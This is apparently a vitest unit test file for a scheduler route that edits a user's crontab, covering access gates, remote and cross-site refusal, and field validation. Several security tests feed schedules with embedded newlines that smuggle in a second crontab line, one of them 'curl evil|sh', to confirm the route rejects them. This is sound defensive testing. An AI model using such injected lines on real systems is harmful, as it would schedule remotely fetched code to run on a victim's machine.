/**
 * test/scheduler-route.test.ts - Unit tests for app/routes/scheduler.tsx.
 *
 * The Nudges page had no test of its own. cron.server.ts and cron-validate.ts
 * are covered (cron.server.test.ts, cron-validate.test.ts) and api.cron.tsx has
 * a gate suite, but scheduler.tsx carries a SECOND, independent action: its own
 * gate, its own field extraction, its own coercions. api.cron.tsx parses with a
 * zod schema; this route reads formData by hand. The two can drift, and nothing
 * was watching this one.
 *
 * ALL cron.server calls are MOCKED. This route calls createCron/updateCron/
 * setEnabled/deleteCron with their DEFAULT deps, and the default writeCrontab
 * runs `crontab -` against the real user crontab. There is no env seam here
 * (no CRON_ROOT the way projects has PROJECTS_ROOT), so a test that let one
 * real call through would rewrite the crontab of whoever ran the suite. The
 * mock is not a convenience, it is the only safe way to test this file.
 *
 * Mocking also buys the assertion the gate suite could not make: what the route
 * hands the seam. The interesting bugs here are coercion bugs (an omitted
 * checkbox, an unknown targetType, an un-normalised schedule), and those are
 * invisible unless you can see the arguments.
 *
 * Covers:
 *   - loader: 404 when the instance gate is off; seam passthrough when on,
 *     for any MC_USER; no crontab read when `crontab` is missing.
 *   - action gate: every intent refused when opted out, seam never called.
 *   - degradation: missing `crontab` and a throwing seam both come back as
 *     { ok: false } with a message, never a throw.
 *   - create: required-field and schedule validation before the seam;
 *     enabled/targetType coercion; schedule normalisation; result passthrough.
 *   - edit: same guards, plus the id requirement.
 *   - setEnabled / delete: id and boolean reach the seam intact.
 *   - unknown and missing intent.
 *
 * ASCII only - no em-dashes.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { createMemoryRouter, RouterProvider } from "react-router";
import type { CronEntry } from "~/lib/cron.server";

// The route imports listCrons/listAgentDirs at module scope and pulls the
// mutating four in via a dynamic import inside the action. vi.mock is hoisted
// and applies to both.
vi.mock("~/lib/cron.server", () => ({
  listCrons: vi.fn((): CronEntry[] => []),
  listAgentDirs: vi.fn((): string[] => []),
  crontabAvailable: vi.fn((): boolean => true),
  createCron: vi.fn(() => ({ ok: true as const, id: "new-id", scriptPath: "/tmp/new-id.sh" })),
  updateCron: vi.fn(() => ({ ok: true as const, id: "abc123", scriptPath: "/tmp/abc123.sh" })),
  setEnabled: vi.fn(() => ({ ok: true as const })),
  deleteCron: vi.fn(() => ({ ok: true as const })),
}));

import SchedulerPage, { loader, action } from "~/routes/scheduler";
import * as cronServer from "~/lib/cron.server";
import { devSocketAddress } from "~/lib/nudge-admin.server";

const seam = vi.mocked(cronServer);

// ---------------------------------------------------------------------------
// Env handling - the instance gate reads process.env at call time.
// ---------------------------------------------------------------------------

const ORIGINAL_MC_USER = process.env["MC_USER"];
const ORIGINAL_CRON_ADMIN = process.env["MC_CRON_ADMIN_ENABLED"];

function restore(key: string, value: string | undefined): void {
  if (value === undefined) delete process.env[key];
  else process.env[key] = value;
}

beforeEach(() => {
  vi.clearAllMocks();
  vi.stubEnv("MC_CRON_ALLOW_REMOTE_ADMIN", undefined);
  seam.crontabAvailable.mockReturnValue(true);
  // Default instance: Nudges on, no opt-out set.
  delete process.env["MC_USER"];
  delete process.env["MC_CRON_ADMIN_ENABLED"];
});

afterEach(() => {
  vi.unstubAllEnvs();
  restore("MC_USER", ORIGINAL_MC_USER);
  restore("MC_CRON_ADMIN_ENABLED", ORIGINAL_CRON_ADMIN);
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Build a form-encoded POST at the scheduler route. */
function makeRequest(fields: Record<string, string>, headers: Record<string, string> = {}): Request {
  return new Request("http://localhost/scheduler", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded", host: "localhost", ...headers },
    body: new URLSearchParams(fields).toString(),
  });
}

/** Invoke the route action with the arg shape react-router passes. */
function runAction(fields: Record<string, string>, context: { socketAddress?: string } = { socketAddress: "127.0.0.1" }, headers?: Record<string, string>) {
  return action({
    request: makeRequest(fields, headers),
    params: {},
    context,
  } as unknown as Parameters<typeof action>[0]);
}

/** Invoke the route loader with the arg shape react-router passes. */
function runLoader(socketAddress = "127.0.0.1") {
  return loader({
    request: new Request("http://localhost/scheduler", { headers: { host: "localhost" } }),
    params: {},
    context: { socketAddress },
  } as unknown as Parameters<typeof loader>[0]);
}

function cronEntry(over: Partial<CronEntry> = {}): CronEntry {
  return {
    id: "abc123",
    schedule: "30 7 * * *",
    target: "sprout",
    message: "morning check-in",
    targetType: "agent",
    scriptPath: "/home/you/agents/sprout/bin/cron-nudge-abc123.sh",
    enabled: true,
    lastFired: null,
    lastDelivered: null,
    ...over,
  };
}

/** The four mutating seam calls, for "nothing was written" assertions. */
function expectNoWrites(): void {
  expect(seam.createCron).not.toHaveBeenCalled();
  expect(seam.updateCron).not.toHaveBeenCalled();
  expect(seam.setEnabled).not.toHaveBeenCalled();
  expect(seam.deleteCron).not.toHaveBeenCalled();
}

/** A create payload that passes every guard, so one field can be varied. */
function validCreate(over: Record<string, string> = {}): Record<string, string> {
  return {
    intent: "create",
    schedule: "30 7 * * *",
    target: "sprout",
    message: "morning check-in",
    enabled: "true",
    ...over,
  };
}

// ---------------------------------------------------------------------------
// Loader
// ---------------------------------------------------------------------------

describe("scheduler loader - instance gate", () => {
  it("throws a 404 Response when the gate is explicitly disabled", async () => {
    process.env["MC_CRON_ADMIN_ENABLED"] = "0";

    // The page is HIDDEN, not merely refused: a 404 is the whole point, so this
    // asserts the thrown value is a Response with that status and not just that
    // something threw.
    await expect(runLoader()).rejects.toBeInstanceOf(Response);
    try {
      await runLoader();
      expect.unreachable("loader should have thrown");
    } catch (e) {
      expect((e as Response).status).toBe(404);
    }
  });

  it("reads NOTHING when the gate is closed", async () => {
    // Refusing after the read would still have shelled out to `crontab -l` on
    // an instance that is not allowed to know what is in it.
    process.env["MC_CRON_ADMIN_ENABLED"] = "0";

    await expect(runLoader()).rejects.toBeInstanceOf(Response);
    expect(seam.listCrons).not.toHaveBeenCalled();
    expect(seam.listAgentDirs).not.toHaveBeenCalled();
  });
});

describe("scheduler loader - seam passthrough", () => {
  it("returns the crons and agents the seam produced, unchanged", async () => {
    const crons = [
      cronEntry({ id: "aaa", target: "sprout" }),
      cronEntry({ id: "bbb", target: "fern", enabled: false, targetType: "script" }),
    ];
    seam.listCrons.mockReturnValue(crons);
    seam.listAgentDirs.mockReturnValue(["sprout", "fern", "quill"]);

    const data = await runLoader();

    expect(data.crons).toEqual(crons);
    expect(data.agents).toEqual(["sprout", "fern", "quill"]);
  });

  it("serves an empty crontab and an empty agent list without inventing rows", async () => {
    seam.listCrons.mockReturnValue([]);
    seam.listAgentDirs.mockReturnValue([]);

    const data = await runLoader();

    expect(data.crons).toEqual([]);
    expect(data.agents).toEqual([]);
  });

  it("loads by default for any MC_USER", async () => {
    process.env["MC_USER"] = "quill";
    seam.listCrons.mockReturnValue([cronEntry()]);

    const data = await runLoader();

    expect(data.crons).toHaveLength(1);
    expect(data.crontabOk).toBe(true);
  });

  it("reports a missing crontab and does not try to read one", async () => {
    seam.crontabAvailable.mockReturnValue(false);

    const data = await runLoader();

    expect(data.crontabOk).toBe(false);
    expect(data.crons).toEqual([]);
    expect(seam.listCrons).not.toHaveBeenCalled();
  });
});

describe("scheduler - request guard", () => {
  it("shows nudges without write controls to a remote visitor", async () => {
    seam.listCrons.mockReturnValue([cronEntry()]);
    const loaderData = await runLoader("192.0.2.10");
    const router = createMemoryRouter([{
      path: "/",
      element: createElement(SchedulerPage, { loaderData } as Parameters<typeof SchedulerPage>[0]),
    }]);
    const html = renderToStaticMarkup(createElement(RouterProvider, { router }));
    expect(html).toContain("morning check-in");
    expect(html).toContain("Remote editing also requires MC_CRON_ALLOW_REMOTE_ADMIN=1 on the server.");
    expect(html).not.toMatch(/<form|<button/);
  });

  it.each(["create", "edit", "setEnabled", "delete", "run"])("refuses remote %s before the seam", async (intent) => {
    await expect(runAction({ ...validCreate(), intent, id: "abc123" }, { socketAddress: "192.0.2.10" }))
      .rejects.toMatchObject({ status: 403 });
    expectNoWrites();
  });

  it.each(["create", "edit", "setEnabled", "delete", "run"])("refuses cross-site %s before the seam", async (intent) => {
    await expect(runAction({ ...validCreate(), intent, id: "abc123" }, undefined, { "sec-fetch-site": "cross-site" }))
      .rejects.toMatchObject({ status: 403 });
    expectNoWrites();
  });

  it("allows a same-origin write through the dev adapter's direct loopback socket", async () => {
    const headers = { "sec-fetch-site": "same-origin", origin: "http://localhost" };
    await expect(devSocketAddress.run("::1", () => runAction(validCreate(), {}, headers)))
      .resolves.toMatchObject({ ok: true });
  });
});

// ---------------------------------------------------------------------------
// Action gate
// ---------------------------------------------------------------------------

describe("scheduler action - instance gate", () => {
  const intents: Array<[string, Record<string, string>]> = [
    ["create", validCreate()],
    ["edit", { intent: "edit", id: "abc123", schedule: "30 7 * * *", target: "sprout", message: "m", enabled: "true" }],
    ["setEnabled", { intent: "setEnabled", id: "abc123", enabled: "false" }],
    ["delete", { intent: "delete", id: "abc123" }],
  ];

  for (const [name, fields] of intents) {
    it(`refuses ${name} when MC_CRON_ADMIN_ENABLED is an explicit off`, async () => {
      process.env["MC_USER"] = "quill";
      process.env["MC_CRON_ADMIN_ENABLED"] = "false";

      const result = await runAction(fields);

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error).toContain("not available on this instance");
      }
      expectNoWrites();
    });

    it(`refuses ${name} with a clear message when crontab is missing`, async () => {
      seam.crontabAvailable.mockReturnValue(false);

      const result = await runAction(fields);

      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toContain("crontab was not found");
      expectNoWrites();
    });
  }

  it("does not even read the body when the gate is closed", async () => {
    // The gate is checked before request.formData(), so a refused request is
    // refused whatever it was carrying.
    process.env["MC_CRON_ADMIN_ENABLED"] = "0";

    const request = makeRequest(validCreate());
    const result = await action({
      request,
      params: {},
      context: { socketAddress: "127.0.0.1" },
    } as unknown as Parameters<typeof action>[0]);

    expect(result.ok).toBe(false);
    expect(request.bodyUsed).toBe(false);
  });

  it("allows any MC_USER through to the seam by default", async () => {
    process.env["MC_USER"] = "quill";

    const result = await runAction(validCreate());

    expect(result.ok).toBe(true);
    expect(seam.createCron).toHaveBeenCalledTimes(1);
  });

  it("turns a throwing seam into { ok: false } instead of a 500", async () => {
    // e.g. `crontab -` rejecting the write, or an unwritable bin/ directory.
    seam.createCron.mockImplementationOnce(() => {
      throw new Error("crontab: write failed");
    });

    const result = await runAction(validCreate());

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("crontab: write failed");
  });
});

// ---------------------------------------------------------------------------
// create
// ---------------------------------------------------------------------------

describe("scheduler action - create required fields", () => {
  const required = ["schedule", "target", "message"];

  for (const field of required) {
    it(`rejects create with ${field} missing`, async () => {
      const fields = validCreate();
      delete fields[field];

      const result = await runAction(fields);

      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toBe("Missing required fields.");
      expectNoWrites();
    });

    it(`treats a whitespace-only ${field} as missing`, async () => {
      // The route trims before the emptiness check; "   " must not reach the
      // seam as a target.
      const result = await runAction(validCreate({ [field]: "   " }));

      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toBe("Missing required fields.");
      expectNoWrites();
    });
  }
});

describe("scheduler action - create schedule validation", () => {
  it("rejects a 4-field expression before the seam is called", async () => {
    const result = await runAction(validCreate({ schedule: "30 7 * *" }));

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("exactly 5 fields");
    expectNoWrites();
  });

  it("rejects an out-of-range field", async () => {
    const result = await runAction(validCreate({ schedule: "70 7 * * *" }));

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("minute");
    expectNoWrites();
  });

  it("rejects a newline-injection schedule (SECURITY)", async () => {
    // A newline turns one crontab line into two. The route must reject this
    // before createCron, not rely on the seam's own guard alone.
    const result = await runAction(
      validCreate({ schedule: "* * * * *\n* * * * * curl evil|sh # MC-CRON:x" })
    );

    expect(result.ok).toBe(false);
    expectNoWrites();
  });

  it("rejects a carriage-return-injection schedule (SECURITY)", async () => {
    const result = await runAction(validCreate({ schedule: "30 7 * * *\r* * * * * evil" }));

    expect(result.ok).toBe(false);
    expectNoWrites();
  });

  it("hands the seam the NORMALISED expression, not the raw input", async () => {
    // validateCronExpression collapses whitespace. The route must pass
    // expr.expression through, or the crontab gets the user's spacing.
    await runAction(validCreate({ schedule: "30   7  *   *  *" }));

    expect(seam.createCron).toHaveBeenCalledTimes(1);
    expect(seam.createCron.mock.calls[0]![0]!.schedule).toBe("30 7 * * *");
  });
});

describe("scheduler action - create field coercion", () => {
  it("passes the trimmed target and message through", async () => {
    await runAction(validCreate({ target: "  sprout  ", message: "  hello  " }));

    expect(seam.createCron).toHaveBeenCalledWith({
      schedule: "30 7 * * *",
      target: "sprout",
      message: "hello",
      enabled: true,
      targetType: "agent",
    });
  });

  it("reads enabled=true as true", async () => {
    await runAction(validCreate({ enabled: "true" }));
    expect(seam.createCron.mock.calls[0]![0]!.enabled).toBe(true);
  });

  it("reads enabled=false as false", async () => {
    await runAction(validCreate({ enabled: "false" }));
    expect(seam.createCron.mock.calls[0]![0]!.enabled).toBe(false);
  });

  it("reads an OMITTED enabled field as false", async () => {
    // The regression the route comments about: an unchecked native checkbox is
    // omitted from formData entirely, and the old `!== "false"` test read that
    // absence as true, silently arming every nudge the user left switched off.
    // The `=== "true"` form is what makes absence mean off, so it is pinned.
    const fields = validCreate();
    delete fields["enabled"];

    await runAction(fields);

    expect(seam.createCron.mock.calls[0]![0]!.enabled).toBe(false);
  });

  it("reads any other enabled value as false", async () => {
    await runAction(validCreate({ enabled: "on" }));
    expect(seam.createCron.mock.calls[0]![0]!.enabled).toBe(false);
  });

  it("reads targetType=script as script", async () => {
    await runAction(validCreate({ targetType: "script" }));
    expect(seam.createCron.mock.calls[0]![0]!.targetType).toBe("script");
  });

  it("reads targetType=agent as agent", async () => {
    await runAction(validCreate({ targetType: "agent" }));
    expect(seam.createCron.mock.calls[0]![0]!.targetType).toBe("agent");
  });

  it("defaults an omitted targetType to agent", async () => {
    await runAction(validCreate());
    expect(seam.createCron.mock.calls[0]![0]!.targetType).toBe("agent");
  });

  it("falls back to agent for an unrecognised targetType", async () => {
    // Only the literal "script" selects script mode. Anything else is agent,
    // so a typo cannot silently write a raw script into the crontab.
    await runAction(validCreate({ targetType: "tmux" }));
    expect(seam.createCron.mock.calls[0]![0]!.targetType).toBe("agent");
  });
});

describe("scheduler action - create result passthrough", () => {
  it("returns the seam's success verbatim, id and scriptPath included", async () => {
    // The route returns createCron's result straight to the fetcher, so the new
    // id has to survive the trip: it is what the page needs to address the row
    // it just made.
    seam.createCron.mockReturnValue({
      ok: true,
      id: "nudge-7",
      scriptPath: "/home/you/agents/sprout/bin/cron-nudge-nudge-7.sh",
    });

    await expect(runAction(validCreate())).resolves.toEqual({
      ok: true,
      id: "nudge-7",
      scriptPath: "/home/you/agents/sprout/bin/cron-nudge-nudge-7.sh",
    });
  });

  it("returns the seam's failure verbatim, without rewording it", async () => {
    seam.createCron.mockReturnValue({ ok: false, error: 'Unknown agent: "sprout".' });

    const result = await runAction(validCreate());

    expect(result).toEqual({ ok: false, error: 'Unknown agent: "sprout".' });
  });
});

// ---------------------------------------------------------------------------
// edit
// ---------------------------------------------------------------------------

describe("scheduler action - edit", () => {
  function validEdit(over: Record<string, string> = {}): Record<string, string> {
    return {
      intent: "edit",
      id: "abc123",
      schedule: "0 9 * * 1-5",
      target: "fern",
      message: "weekday standup",
      enabled: "true",
      ...over,
    };
  }

  for (const field of ["id", "schedule", "target", "message"]) {
    it(`rejects edit with ${field} missing`, async () => {
      const fields = validEdit();
      delete fields[field];

      const result = await runAction(fields);

      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toBe("Missing required fields.");
      expectNoWrites();
    });
  }

  it("rejects a malformed schedule before the seam", async () => {
    // updateCron re-validates internally, but the route validates too so the
    // edit path fails in the same place, and with the same message, as create.
    const result = await runAction(validEdit({ schedule: "not a cron" }));

    expect(result.ok).toBe(false);
    expectNoWrites();
  });

  it("rejects a newline-injection schedule on the edit path too (SECURITY)", async () => {
    const result = await runAction(validEdit({ schedule: "0 9 * * *\n* * * * * evil" }));

    expect(result.ok).toBe(false);
    expectNoWrites();
  });

  it("passes the id and the normalised schedule to updateCron", async () => {
    await runAction(validEdit({ schedule: "0    9 * * 1-5" }));

    expect(seam.updateCron).toHaveBeenCalledWith({
      id: "abc123",
      schedule: "0 9 * * 1-5",
      target: "fern",
      message: "weekday standup",
      enabled: true,
      targetType: "agent",
    });
  });

  it("applies the same enabled and targetType coercion as create", async () => {
    const fields = validEdit({ targetType: "script" });
    delete fields["enabled"];

    await runAction(fields);

    expect(seam.updateCron.mock.calls[0]![0]!.enabled).toBe(false);
    expect(seam.updateCron.mock.calls[0]![0]!.targetType).toBe("script");
  });

  it("returns the seam's failure verbatim", async () => {
    seam.updateCron.mockReturnValue({ ok: false, error: "No such cron: abc123." });

    await expect(runAction(validEdit())).resolves.toEqual({
      ok: false,
      error: "No such cron: abc123.",
    });
  });
});

// ---------------------------------------------------------------------------
// setEnabled
// ---------------------------------------------------------------------------

describe("scheduler action - setEnabled", () => {
  it("toggles on for enabled=true", async () => {
    await runAction({ intent: "setEnabled", id: "abc123", enabled: "true" });
    expect(seam.setEnabled).toHaveBeenCalledWith("abc123", true);
  });

  it("toggles off for enabled=false", async () => {
    await runAction({ intent: "setEnabled", id: "abc123", enabled: "false" });
    expect(seam.setEnabled).toHaveBeenCalledWith("abc123", false);
  });

  it("toggles off when enabled is omitted", async () => {
    await runAction({ intent: "setEnabled", id: "abc123" });
    expect(seam.setEnabled).toHaveBeenCalledWith("abc123", false);
  });

  it("trims the id", async () => {
    await runAction({ intent: "setEnabled", id: "  abc123  ", enabled: "true" });
    expect(seam.setEnabled).toHaveBeenCalledWith("abc123", true);
  });

  it("returns the seam's failure verbatim", async () => {
    seam.setEnabled.mockReturnValue({ ok: false, error: "No such cron: nope." });

    await expect(
      runAction({ intent: "setEnabled", id: "nope", enabled: "true" })
    ).resolves.toEqual({ ok: false, error: "No such cron: nope." });
  });
});

// ---------------------------------------------------------------------------
// delete
// ---------------------------------------------------------------------------

describe("scheduler action - delete", () => {
  it("passes the id to deleteCron", async () => {
    await runAction({ intent: "delete", id: "abc123" });
    expect(seam.deleteCron).toHaveBeenCalledWith("abc123");
  });

  it("trims the id", async () => {
    await runAction({ intent: "delete", id: "  abc123  " });
    expect(seam.deleteCron).toHaveBeenCalledWith("abc123");
  });

  it("returns the seam's failure verbatim", async () => {
    seam.deleteCron.mockReturnValue({ ok: false, error: "No such cron: nope." });

    await expect(runAction({ intent: "delete", id: "nope" })).resolves.toEqual({
      ok: false,
      error: "No such cron: nope.",
    });
  });
});

// ---------------------------------------------------------------------------
// Round trip
// ---------------------------------------------------------------------------

describe("scheduler action - create, toggle, delete round trip", () => {
  it("carries one id from create through toggle to delete", async () => {
    // The loader and the action are two halves of one page: what create writes
    // is what the next loader lists, and the id on that row is what the toggle
    // and the delete send back. This walks that circuit with the seam stubbed,
    // so a break in the wiring between the two shows up here rather than only
    // in a browser.
    seam.createCron.mockReturnValue({
      ok: true,
      id: "nudge-1",
      scriptPath: "/home/you/agents/sprout/bin/cron-nudge-nudge-1.sh",
    });
    const created = await runAction(validCreate({ target: "sprout", message: "stand up" }));
    expect(created.ok).toBe(true);

    const row = cronEntry({ id: "nudge-1", target: "sprout", message: "stand up" });
    seam.listCrons.mockReturnValue([row]);
    const listed = await runLoader();
    expect(listed.crons).toHaveLength(1);
    expect(listed.crons[0]!.enabled).toBe(true);

    const id = listed.crons[0]!.id;
    await runAction({ intent: "setEnabled", id, enabled: "false" });
    expect(seam.setEnabled).toHaveBeenCalledWith("nudge-1", false);

    seam.listCrons.mockReturnValue([{ ...row, enabled: false }]);
    const afterToggle = await runLoader();
    expect(afterToggle.crons[0]!.enabled).toBe(false);

    await runAction({ intent: "delete", id });
    expect(seam.deleteCron).toHaveBeenCalledWith("nudge-1");

    seam.listCrons.mockReturnValue([]);
    const afterDelete = await runLoader();
    expect(afterDelete.crons).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Unknown intent
// ---------------------------------------------------------------------------

describe("scheduler action - unknown intent", () => {
  it("rejects an unrecognised intent and echoes it", async () => {
    const result = await runAction({ intent: "destroy" });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain("Unknown intent");
      expect(result.error).toContain("destroy");
    }
    expectNoWrites();
  });

  it("rejects a request with no intent at all", async () => {
    const result = await runAction({ id: "abc123" });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unknown intent");
    expectNoWrites();
  });

  it("does not treat a near-miss intent as its neighbour", async () => {
    // "deleteCron" is not "delete". Prefix matching here would delete a nudge
    // on a request that asked for something else.
    const result = await runAction({ intent: "deleteCron", id: "abc123" });

    expect(result.ok).toBe(false);
    expectNoWrites();
  });
});
